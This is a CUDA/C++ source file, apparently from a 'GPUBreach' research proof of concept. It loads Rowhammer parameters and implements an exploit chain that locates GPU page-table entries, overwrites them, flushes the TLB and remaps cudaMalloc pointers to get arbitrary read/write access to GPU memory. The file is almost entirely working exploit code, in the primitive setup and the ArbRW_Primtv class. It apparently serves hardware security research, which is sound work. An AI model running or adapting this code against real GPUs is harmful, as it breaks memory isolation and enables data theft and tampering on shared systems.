#include <INIReader.h>
#include <algorithm>
#include <chrono>
#include <gpubreach_util.cuh>
#include <unordered_map>

GPUBreachContext::BitFlipConfig::BitFlipConfig (const std::string &config_file)
{
  INIReader reader (config_file);
  if (reader.ParseError () < 0)
    {
      std::cout << "Can't load " + config_file + "\n";
      exit (1);
    }

  // RH Config
  const std::string rh_section = "rh_config";
  num_agg = reader.GetUnsigned64 (rh_section, "num_agg", 0);
  row_step = reader.GetUnsigned64 (rh_section, "row_step", 0);
  num_rows = reader.GetUnsigned64 (rh_section, "num_rows", 0);
  it = reader.GetUnsigned64 (rh_section, "it", 0);
  n = reader.GetUnsigned64 (rh_section, "n", 0);
  k = reader.GetUnsigned64 (rh_section, "k", 0);
  delay = reader.GetUnsigned64 (rh_section, "delay", 0);
  period = reader.GetUnsigned64 (rh_section, "period", 0);
  repeat = reader.GetUnsigned64 (rh_section, "repeat", 0);
  mem_size = reader.GetUnsigned64 (rh_section, "mem_size", 0);

  // Flip Config
  const std::string flip_section = "flip_config";
  agg_pat = reader.GetString (flip_section, "agg_pat", "0x00");
  row_set_file = reader.GetString (flip_section, "row_set_file", "");
  left = reader.GetBoolean (flip_section, "left", false);
  vic_row = reader.GetUnsigned64 (flip_section, "vic_row", 0);
  crit_agg = reader.GetUnsigned64 (flip_section, "crit_agg", 0);
}

__global__ void
initialize_memory (uint8_t *array, uint64_t size)
{
  int id = (blockIdx.x * blockDim.x + threadIdx.x) * 65536;
  if (id < size)
    *(uint8_t **)(array + id) = array + id;
}

__global__ void
initialize_memory_loop (uint8_t *array, uint64_t size)
{
  for (uint64_t i = 0; i < size; i += 65536)
    *(uint8_t **)(array + i) = array + i;
}

__global__ void
print_memory (uint8_t *array, uint64_t size)
{
  for (uint64_t i = 0; i < size; i += 8)
    {
      int sum = 0;
      for (uint64_t j = 0; j < 8; j++)
        {
          sum += *(array + i + j) & 0xff;
        }
      if (sum != 0)
        {
          printf ("%x: ", i);
          for (uint64_t j = 0; j < 8; j++)
            {
              printf ("%x ", *(array + i + j) & 0xff);
            }

          printf ("\n");
        }
    }
}

double
time_data_access (uint8_t *array, uint64_t size)
{
  uint64_t threads = std::ceil (size / 65536.0);
  auto start = std::chrono::high_resolution_clock::now ();
  initialize_memory<<<1, threads>>> (array, size);
  cudaDeviceSynchronize ();
  auto end = std::chrono::high_resolution_clock::now ();

  gpuErrchk (cudaPeekAtLastError ());
  std::chrono::duration<double, std::milli> duration_evict = end - start;
  return duration_evict.count ();
}

void
evict_from_device (uint8_t *array, uint64_t size)
{
  for (int j = 0; j < size; j += 65536)
    *(array + j) = 'a';
}

__global__ void
memset_ptr (uint8_t *dst, uint64_t src, uint64_t size)
{
  for (size_t i = 0; i < size; i += 8)
    {
      *(uint64_t *)(dst + i) = src; // array-style access
    }
}

void
removeFirstNArgs (int &argc, char *argv[], int n)
{
  for (int i = n; i < argc; ++i)
    argv[i - n] = argv[i];
  argc -= n;
  argv[argc] = nullptr;
}

uint64_t
get_memory_limit ()
{
  size_t total_byte;
  auto cuda_status = cudaMemGetInfo (nullptr, &total_byte);
  if (cudaSuccess != cuda_status)
    {
      printf ("Error: cudaMemGetInfo fails, %s \n",
              cudaGetErrorString (cuda_status));
      exit (1);
    }

  return total_byte;
}

std::pair<RowList, std::vector<uint64_t>>
get_new_rows (RowList &rows, std::vector<uint64_t> aggressors, uint8_t *layout, std::vector<uint8_t *> new_base_ptrs)
{
  RowList result;
  int min_id = *std::min_element(std::begin(aggressors), std::end(aggressors));
  uint8_t * min_row_addr_2MB_align = (uint8_t*)((uint64_t)rows[min_id][0] - ((uint64_t)rows[min_id][0] % ALLOC_SIZE));
  std::unordered_map<uint64_t, uint64_t> row_id_to_new_idx;

  for (uint64_t row_id : aggressors) {
      if (row_id_to_new_idx.count(row_id)) continue;

      const Row &src = rows[row_id];
      Row rebased;
      rebased.reserve(src.size());

      for (uint8_t *ptr : src) {
          rebased.push_back(new_base_ptrs[(ptr - min_row_addr_2MB_align) / ALLOC_SIZE] +  ((ptr - min_row_addr_2MB_align) % ALLOC_SIZE));
      }

      row_id_to_new_idx[row_id] = result.size();
      result.push_back(std::move(rebased));
  }

  std::vector<uint64_t> new_aggressors;
  new_aggressors.reserve(aggressors.size());
  for (uint64_t row_id : aggressors) {
      new_aggressors.push_back(row_id_to_new_idx[row_id]);
  }

  return {std::move(result), std::move(new_aggressors)};
}

void
paused ()
{
  std::cin.clear ();
  std::cin.ignore (std::numeric_limits<std::streamsize>::max (), '\n');
}

void
gen_64KB (uint8_t *array, uint64_t size)
{
  for (uint64_t i = 0; i < size; i += 2 * 1024 * 1024)
    *(uint8_t **)(array + i) = (array + i);
}

__global__ void
simple_flush (uint8_t *array, uint64_t size)
{
  for (uint64_t i = 0; i < size; i += 64 * 1024)
    {
      if ((i % (2 * 1024 * 1024)) != 0)
        *(uint8_t **)(array + i) = (array + i);
    }
}

__global__ void
check_region_inner (uint8_t *base, uint64_t ALLOC_SIZE)
{
  const uint64_t stride = 64 * 1024;
  uint64_t j = ((uint64_t)blockIdx.x * blockDim.x + threadIdx.x + 1)
               * stride; // +1: j starts at 1*stride

  if (j >= ALLOC_SIZE)
    return;

  uint64_t temp_addr = *reinterpret_cast<uint64_t *> (base + j);

  if (reinterpret_cast<uint64_t> (base + j) != temp_addr)
    {
      // Race to store lowest j as the winner
      uint64_t prev = atomicMin (
          reinterpret_cast<unsigned long long *> (base + 64 * 1024 + 16),
          static_cast<unsigned long long> (j));

      atomicExch (
          reinterpret_cast<unsigned long long *> (base + 64 * 1024 + 8), 1ULL);

      if (prev > j)
        {
          atomicExch (
              reinterpret_cast<unsigned long long *> (base + 64 * 1024 + 24),
              static_cast<unsigned long long> (temp_addr));
        }
    }
}

void
flush_tlb (uint8_t *flush_ptr, uint64_t flush_size)
{
  simple_flush<<<1, 1>>> (flush_ptr, flush_size);
  cudaDeviceSynchronize ();
  gpuErrchk (cudaPeekAtLastError ());
}

void
modify (uint8_t *pte_local, uint64_t pte)
{
  memset_ptr<<<1, 1>>> (pte_local, pte, 8);
  cudaDeviceSynchronize ();
  gpuErrchk (cudaPeekAtLastError ());
}

void
setup_cudaMalloc_primitive (ArbRW_Primtv &prim,
                            std::vector<uint8_t *> &cudaMalloced_ptrs)
{
  // Used to Identify 2MB PTEs when scanning memory.
  const uint64_t mask_2MB_pte = 0xFF0000000000FFFFULL;
  cudaMemcpyArray (prim.data_device_ptr, prim.pt_ptr, 64L * KB);

  uint64_t future_pt_ptr_pte_ofs = 0;
  for (uint64_t z = 0; z < 64L * KB; z += 16) // Each 2MB PTE is 16B
    {
      DBG_OUT << (void *)z << ' ' << *(void **)(prim.data_device_ptr + z)
              << ' '
              << (void *)((*(uint64_t *)(prim.data_device_ptr + z))
                          & mask_2MB_pte)
              << '\n';
      uint64_t pte_id
          = (*(uint64_t *)(prim.data_device_ptr + z)) & mask_2MB_pte;

      // Found a potential 2MB PTE, which we use for arbitrary rw
      if (pte_id == NULL_PTE && prim.arb_rw_phys == 0)
        {
          prim.arb_rw_phys
              = *(uint64_t *)(prim.data_device_ptr + z); // PTE value
          prim.arb_rw_phys_ofs = z; // ofs RELATIVE to current 64KB PT pointer.
          DBG_OUT << "Found " << prim.arb_rw_phys << '\n';
        }
      // If next immediate PTE is not 2MB, the previous one could've been an
      // aligned 64KB page.
      else if (pte_id != (NULL_PTE) && prim.arb_rw_phys != 0)
        {
          prim.arb_rw_phys = 0;
          prim.arb_rw_phys_ofs = 0;
        }
      // Get another 2MB PTE, which we use to point to page tables.
      else if (pte_id == (NULL_PTE))
        {
          future_pt_ptr_pte_ofs
              = z; // ofs RELATIVE to current 64KB PT pointer.
          break;
        }
    }

  if (debug_enabled ())
    {
      std::cout << "Done \n";
      paused ();
    }

  std::cout << "Found candidate pointers\n";

  /**
   * prim.arb_rw_phys_ofs is by default used, where we remap that page to NULL
   *
   * We should be able to find this page now due to mismatch.
   */
  prim.modify (NULL_PTE);
  prim.flush_tlb ();
  for (int j = 0; j < cudaMalloced_ptrs.size (); j++)
    {
      cudaMemcpyArray (prim.data_device_ptr, (uint8_t *)cudaMalloced_ptrs[j],
                       8);
      DBG_OUT << (void *)cudaMalloced_ptrs[j] << ' '
              << *(void **)prim.data_device_ptr << '\n';
      if (*(void **)prim.data_device_ptr != (void *)cudaMalloced_ptrs[j])
        {
          DBG_OUT << "Arb:" << (void *)cudaMalloced_ptrs[j] << ' '
                  << *(void **)prim.data_device_ptr << ' ' << j << '\n'
                  << std::flush;
          prim.arb_rw_ptr = cudaMalloced_ptrs[j];
          break;
        }
    }

  std::cout << "Found Arbitrary RW pointer candidate\n";

  uint64_t it_ptr = NULL_PTE;

  /**
   * This is the offset of the arbitrary rw PTE in a 2MB page (prim.pt_ptr
   * currently is a 64KB page) This will become the new offset used in the
   * modify primitive (prim.arb_rw_phys_ofs), given we will use the new pt_ptr
   * found in this loop
   */
  uint64_t target_pte_ofs
      = ((uint64_t)prim.pt_ptr + prim.arb_rw_phys_ofs) % ALLOC_SIZE;

  // Scan GPU memory for the PTE of arb_rw_ptr.
  for (uint64_t i = 0; i < get_memory_limit () - 1 * GB; i += ALLOC_SIZE)
    {
      // arb_rw_ptr now point to it_ptr.
      prim.modify (it_ptr);
      prim.flush_tlb ();

      // READ the known PTE position in a 2MB page
      cudaMemcpyArray (prim.data_device_ptr,
                       (uint8_t *)prim.arb_rw_ptr + target_pte_ofs, 8);
      DBG_OUT << (void *)it_ptr << ' ' << *(void **)prim.data_device_ptr
              << '\n';

      // If the PTE match, then it_ptr is the PT page containing arb_rw_ptr's
      // PTE.
      if (*(void **)prim.data_device_ptr == (void *)it_ptr)
        {
          DBG_OUT << *(void **)prim.data_device_ptr << '\n';
          break;
        }
      it_ptr += 0x20000;
    }
  std::cout << "Found PT location of Arbitrary RW pointer\n";

  // Now make the other cudaMalloc pointer we chose to point to this location.
  prim.modify (future_pt_ptr_pte_ofs, it_ptr);
  prim.flush_tlb ();

  prim.pt_phys = it_ptr;

  // Find the other remapped cudaMalloc pointer
  for (int j = 0; j < cudaMalloced_ptrs.size (); j++)
    {
      cudaMemcpyArray (prim.data_device_ptr, (uint8_t *)cudaMalloced_ptrs[j],
                       8);
      if ((void *)cudaMalloced_ptrs[j] != prim.arb_rw_ptr
          && *(void **)prim.data_device_ptr != (void *)cudaMalloced_ptrs[j])
        {
          DBG_OUT << "PT rw:" << (void *)cudaMalloced_ptrs[j] << ' '
                  << *(void **)prim.data_device_ptr << ' ' << j << '\n';

          // We can now use this instead of the 64KB pointer.
          prim.pt_ptr = cudaMalloced_ptrs[j];
          prim.pt_phys_ofs = j;
          break;
        }
    }

  // We use the known 2MB offset with the new pt_ptr
  prim.arb_rw_phys_ofs = target_pte_ofs;

  std::cout << "Found PT pointer candidate\n";

  cudaMemcpyArray (prim.data_device_ptr,
                   (uint8_t *)prim.pt_ptr + prim.arb_rw_phys_ofs, 8);
  DBG_OUT << "PT rw:" << *(void **)prim.data_device_ptr
          << " Orig: " << prim.pt_phys << '\n';
  cudaMemcpyArray (prim.data_device_ptr, (uint8_t *)prim.arb_rw_ptr, 8);
  DBG_OUT << "Arbitrary rw:" << *(void **)prim.data_device_ptr
          << " Orig: " << prim.arb_rw_phys << '\n';
}

ArbRW_Primtv::ArbRW_Primtv ()
{
  cudaMallocManaged (&flush_ptr, flush_size);
  cudaMallocManaged (&data_device_ptr, ALLOC_SIZE);

  initialize_memory_loop<<<1, 1>>> (flush_ptr, flush_size);
  cudaDeviceSynchronize ();
  gpuErrchk (cudaPeekAtLastError ());
}

ArbRW_Primtv::~ArbRW_Primtv ()
{
  cudaFree (flush_ptr);
  cudaFree (data_device_ptr);
}

void
ArbRW_Primtv::gen_64KB ()
{
  for (uint64_t i = 0; i < flush_size; i += 2 * 1024 * 1024)
    *(uint8_t **)(flush_ptr + i) = (flush_ptr + i);
}

void
ArbRW_Primtv::flush_tlb ()
{
  simple_flush<<<1, 1>>> (flush_ptr, flush_size);
  cudaDeviceSynchronize ();
  gpuErrchk (cudaPeekAtLastError ());
}

/**
 * @brief Set prim.arb_rw_ptr to point to pte
 *
 * @param pte
 */
void
ArbRW_Primtv::modify (uint64_t pte)
{
  memset_ptr<<<1, 1>>> (pt_ptr + arb_rw_phys_ofs, pte, 8);
  cudaDeviceSynchronize ();
}

/**
 * @brief Set some other pointer at ofs to pte
 *
 * @param pte
 */
void
ArbRW_Primtv::modify (uint64_t ofs, uint64_t pte)
{
  memset_ptr<<<1, 1>>> (pt_ptr + ofs, pte, 8);
  cudaDeviceSynchronize ();
}

void
ArbRW_Primtv::modify (uint8_t *ptr, uint64_t ofs, uint64_t pte)
{
  memset_ptr<<<1, 1>>> (ptr + ofs, pte, 8);
  cudaDeviceSynchronize ();
}
